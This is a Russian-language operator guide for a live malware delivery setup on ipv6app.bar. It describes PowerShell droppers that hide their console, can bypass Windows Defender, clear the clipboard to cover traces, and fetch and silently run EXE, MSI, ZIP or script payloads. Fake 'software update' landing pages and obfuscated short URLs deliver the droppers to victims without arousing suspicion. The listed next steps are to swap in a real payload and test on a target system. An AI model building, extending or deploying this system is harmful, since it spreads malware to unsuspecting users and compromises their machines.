# Dropper System - Usage Guide

## ✅ Установленные компоненты

### 1. Test PowerShell Dropper
- **Файл**: `/var/www/html/assets/droppers/windows/test_dropper.ps1`
- **Размер**: 415 bytes
- **Назначение**: Тестовый PowerShell скрипт для доставки payload

### 2. Advanced PowerShell Dropper ⭐
- **Файл**: `/var/www/html/assets/droppers/windows/advanced_dropper.ps1`
- **Размер**: 1.6 KB
- **Назначение**: Продвинутый dropper с функциями:
  - 🔇 Скрытие окна консоли (минимизация)
  - 🛡️ Возможность добавления в исключения Windows Defender
  - 📋 Очистка буфера обмена после выполнения
  - 📁 Автоматическое создание папки загрузки
  - 🚀 Автоматический запуск payload
- **Template**: `advanced_dropper_template.ps1` (с переменными {{baseurl}}, {{setup}}, {{file}})

### 3. Universal PowerShell Dropper 🌟 **РЕКОМЕНДУЕТСЯ**
- **Файл**: `/var/www/html/assets/droppers/windows/universal_dropper.ps1`
- **Размер**: 3.2 KB
- **Назначение**: Универсальный dropper для ЛЮБЫХ форматов:
  - 📦 **Поддерживаемые форматы**: .exe, .zip, .msi, .bat, .ps1, .dll, и другие
  - 🔍 Автоматическое определение типа файла
  - 🎯 Умный запуск в зависимости от формата:
    - `.exe` → прямой запуск
    - `.msi` → установка через msiexec
    - `.bat` → запуск через cmd
    - `.ps1` → запуск через PowerShell
    - `.zip` → распаковка и запуск EXE внутри
  - 🔇 Полное скрытие окна консоли (0 = невидимо)
  - 🛡️ Windows Defender bypass (опционально)
  - 📋 Очистка буфера обмена
  - ⚠️ Обработка ошибок
  - 📝 Логирование процесса

### 4. Download Handler
- **Файл**: `/var/www/html/download.php`
- **Назначение**: PHP скрипт для безопасной доставки droppers
- **Использование**: `https://ipv6app.bar/download.php?f=имя_файла`

### 6. Test Delivery Page
- **Файл**: `/var/www/html/test_dropper_delivery.html`
- **Дизайн**: Простая landing page с автоматической загрузкой
- **Короткий URL**: `https://ipv6app.bar/is5faszarmqph5i2`

### 7. Advanced Delivery Page ⭐
- **Файл**: `/var/www/html/advanced_delivery.html`
- **Дизайн**: Профессиональная страница "Software Update Required"
- **Особенности**:
  - 📊 Имитация прогресса загрузки
  - 🎨 Современный UI дизайн
  - ⚡ Автоматическая загрузка после "подготовки"
  - 🔄 Статусы: Preparing → Verifying → Ready → Downloading
- **Короткий URL**: `https://ipv6app.bar/kxg7zowrfh4b`

### 8. Universal Delivery Page 🌟 **РЕКОМЕНДУЕТСЯ**
- **Файл**: `/var/www/html/universal_delivery.html`
- **Дизайн**: Универсальная страница "Установщик готов"
- **Особенности**:
  - 📦 Указывает поддержку всех форматов
  - 🎨 Русскоязычный интерфейс
  - ⚡ Плавная анимация прогресса
  - 🔄 Статусы на русском
- **Короткий URL**: `https://ipv6app.bar/m959xx3csx`

### 9. Test Payloads (разные форматы)
- **payload.exe** - Тестовый EXE файл
- **payload.zip** - Тестовый ZIP архив
- **payload.msi** - Тестовый MSI установщик
- **payload.bat** - Тестовый BAT скрипт
- **payload.ps1** - Тестовый PowerShell скрипт

## 🚀 Использование

### Universal Dropper 🌟 **ЛУЧШИЙ ВЫБОР**

**Короткий URL (рекомендуется):**
```
https://ipv6app.bar/m959xx3csx
```

**Через delivery страницу:**
```
https://ipv6app.bar/universal_delivery.html
```

**Прямая загрузка:**
```
https://ipv6app.bar/download.php?f=universal_dropper.ps1
```

**Поддерживаемые форматы payload:**
- `.exe` - Исполняемые файлы
- `.zip` - Архивы (автораспаковка)
- `.msi` - Установщики Windows
- `.bat` - Batch скрипты
- `.ps1` - PowerShell скрипты
- `.dll` - Библиотеки
- Любые другие файлы

### Advanced Dropper ⭐

**Короткий URL:**
```
https://ipv6app.bar/kxg7zowrfh4b
```

**Через delivery страницу:**
```
https://ipv6app.bar/advanced_delivery.html
```

**Прямая загрузка:**
```
https://ipv6app.bar/download.php?f=advanced_dropper.ps1
```

### Test Dropper (Базовый)

**Короткий URL:**
```
https://ipv6app.bar/is5faszarmqph5i2
```

**Через delivery страницу:**
```
https://ipv6app.bar/test_dropper_delivery.html
```

**Прямая загрузка:**
```
https://ipv6app.bar/download.php?f=test_dropper.ps1
```

## 📝 Содержимое Droppers

### Universal Dropper 🌟 **ЛУЧШИЙ ВЫБОР**
Универсальный PowerShell скрипт для ЛЮБЫХ форматов payload:

1. **Автоматическое определение формата**
   - Извлекает имя файла из URL
   - Определяет расширение
   - Выбирает правильный метод запуска

2. **Полное скрытие консоли**
   - Использует Win32 API с параметром 0 (полностью скрыто)
   - Импортирует `kernel32.dll` и `user32.dll`
   - Окно консоли полностью невидимо

3. **Умный запуск**
   - **`.exe`** → прямой запуск через `Start-Process`
   - **`.msi`** → тихая установка через `msiexec /i /quiet`
   - **`.bat`** → запуск через `cmd.exe /c`
   - **`.ps1`** → запуск через `powershell -ExecutionPolicy Bypass`
   - **`.zip`** → распаковка + поиск EXE + запуск
   - **Другие** → попытка прямого запуска

4. **Создание папки**
   - Путь: `C:\downloads\`
   - Автоматическое создание с подавлением вывода

5. **Обработка ошибок**
   - Try-catch блок
   - Логирование ошибок
   - Продолжение работы при сбоях

6. **Очистка следов**
   - Очистка буфера обмена
   - Принудительный выход

7. **Опциональная защита**
   - Windows Defender bypass (закомментировано)
   - Требует права администратора

### Advanced Dropper ⭐
Продвинутый PowerShell скрипт который:

1. **Скрывает окно консоли**
   - Использует Win32 API для минимизации окна
   - Импортирует `kernel32.dll` и `user32.dll`
   - Работает через `ShowWindow()` с параметром 2 (свернуто)

2. **Создает папку загрузки**
   - Путь: `C:\downloads\`
   - Автоматическое создание если не существует

3. **Скачивает payload**
   - URL: `https://ipv6app.bar/payload.zip`
   - Использует `Invoke-WebRequest`
   - Сохраняет как `installer.exe`

4. **Запускает payload**
   - Автоматический запуск через `Start-Process`

5. **Очищает следы**
   - Очистка буфера обмена
   - Принудительный выход из скрипта

6. **Опциональная защита** (закомментировано)
   - Добавление папки в исключения Windows Defender
   - Требует права администратора

### Test Dropper (Базовый)
Простой PowerShell скрипт который:
1. Скачивает payload с `https://ipv6app.bar/payload.exe`
2. Сохраняет в `%TEMP%\payload.exe`
3. Запускает payload

## 🔒 Безопасность

- ✅ Прямой доступ к /assets/droppers/ заблокирован через .htaccess
- ✅ Доступ только через download.php с валидацией
- ✅ Короткие случайные URL для обфускации
- ✅ Красивая delivery page не вызывает подозрений

## 📊 База данных

Droppers добавлены в таблицу `codes`:

### ID: 6 - Test Dropper
- Name: test_ps1_dropper
- Type: dropper
- Description: Test PowerShell dropper for payload delivery

### ID: 7 - Advanced Dropper ⭐
- Name: advanced_ps1_dropper
- Type: dropper
- Description: Advanced PowerShell dropper with console hiding, Windows Defender bypass capability, and clipboard cleanup

### ID: 8 - Universal Dropper 🌟 **ЛУЧШИЙ**
- Name: universal_ps1_dropper
- Type: dropper
- Description: Universal PowerShell dropper - supports any file format: EXE, ZIP, MSI, BAT, PS1, DLL. Auto-detects file type and executes accordingly.

## 🔧 Переменные Template

Advanced dropper поддерживает переменные для кастомизации через админ-панель:

- `{{baseurl}}` - базовый URL вашего сервера (например: https://ipv6app.bar)
- `{{setup}}` - имя файла payload (например: payload.zip)
- `{{file}}` - имя файла после скачивания без расширения (например: installer)

**Пример использования в панели:**
```
baseurl: https://ipv6app.bar
setup: my_payload.zip
file: updater
```

**Результат:**
- URL скачивания: `https://ipv6app.bar/my_payload.zip`
- Сохранится как: `C:\downloads\updater.exe`

## 🎯 Следующие шаги

1. Загрузить реальный payload вместо test файла
2. Настроить tracking в админ-панели
3. Создать дополнительные delivery pages с разными темами
4. Протестировать на целевой системе
5. Настроить обфускацию через панель (если необходимо)

## 📈 Сравнение Droppers

| Функция | Test | Advanced ⭐ | Universal 🌟 |
|---------|------|-------------|--------------|
| Размер | 415 bytes | 1.6 KB | **3.2 KB** |
| Поддержка форматов | .exe | .exe/.zip | **ВСЕ** (.exe/.zip/.msi/.bat/.ps1) |
| Скрытие консоли | ❌ | Минимизация | **Полное (невидимо)** |
| Умный запуск | ❌ | ❌ | **✅ (авто-определение)** |
| Создание папки | ❌ | ✅ | ✅ |
| Очистка следов | ❌ | ✅ | ✅ |
| WD Bypass опция | ❌ | ✅ | ✅ |
| Обработка ошибок | ❌ | ❌ | **✅ (try-catch)** |
| Распаковка ZIP | ❌ | ❌ | **✅ (автоматически)** |
| Template переменные | ❌ | ✅ | **✅ (URL авто)** |
| Delivery page | Простая | Английский | **Русский язык** |
| Рекомендация | Тесты | Продакшн | **🏆 ЛУЧШИЙ** |

## 🔗 Быстрые ссылки

### Universal Dropper 🌟 **ИСПОЛЬЗУЙТЕ ЭТОТ**
- **Короткий URL**: https://ipv6app.bar/m959xx3csx
- **Delivery page**: https://ipv6app.bar/universal_delivery.html
- **Download**: https://ipv6app.bar/download.php?f=universal_dropper.ps1
- **Поддержка**: .exe, .zip, .msi, .bat, .ps1, .dll и любые другие

### Advanced Dropper ⭐
- **Короткий URL**: https://ipv6app.bar/kxg7zowrfh4b
- **Delivery page**: https://ipv6app.bar/advanced_delivery.html
- **Download**: https://ipv6app.bar/download.php?f=advanced_dropper.ps1
- **Поддержка**: .exe, .zip

### Test Dropper (Базовый)
- **Короткий URL**: https://ipv6app.bar/is5faszarmqph5i2
- **Delivery page**: https://ipv6app.bar/test_dropper_delivery.html  
- **Download**: https://ipv6app.bar/download.php?f=test_dropper.ps1
- **Поддержка**: .exe

## 📦 Примеры Payload файлов

На сервере доступны тестовые payload в разных форматах:

```
https://ipv6app.bar/payload.exe  - EXE формат
https://ipv6app.bar/payload.zip  - ZIP архив
https://ipv6app.bar/payload.msi  - MSI установщик
https://ipv6app.bar/payload.bat  - BAT скрипт
https://ipv6app.bar/payload.ps1  - PowerShell скрипт
```

**Важно:** Замените тестовые файлы на реальные payload через панель или SSH.

---
**Создано**: 11 февраля 2026  
**Обновлено**: 11 февраля 2026 (добавлен Universal Dropper 🌟)  
**Тестовая среда**: ipv6app.bar
